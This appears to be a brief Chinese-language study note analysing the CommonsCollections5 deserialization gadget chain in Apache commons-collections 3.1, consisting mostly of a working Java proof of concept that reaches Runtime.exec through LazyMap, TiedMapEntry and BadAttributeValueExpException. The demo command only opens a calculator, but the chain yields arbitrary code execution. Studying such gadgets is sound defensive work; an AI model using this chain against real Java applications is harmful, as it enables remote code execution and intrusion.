# CommonsCollections5分析

## 1.环境搭建

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

## 2.调试分析

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open -a calculator"})
});

Map decorate = LazyMap.decorate(new HashMap<>(), chainedTransformer);
TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "123");

BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

Class badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();
Field val = badAttributeValueExpExceptionClass.getDeclaredField("val");
val.setAccessible(true);
val.set(badAttributeValueExpException,tiedMapEntry);


byte[] serialize = serialize(badAttributeValueExpException);

unSerialize(serialize);
```





## 3.调用图

![image-20240401000921290](./img/image-20240401000921290.png)







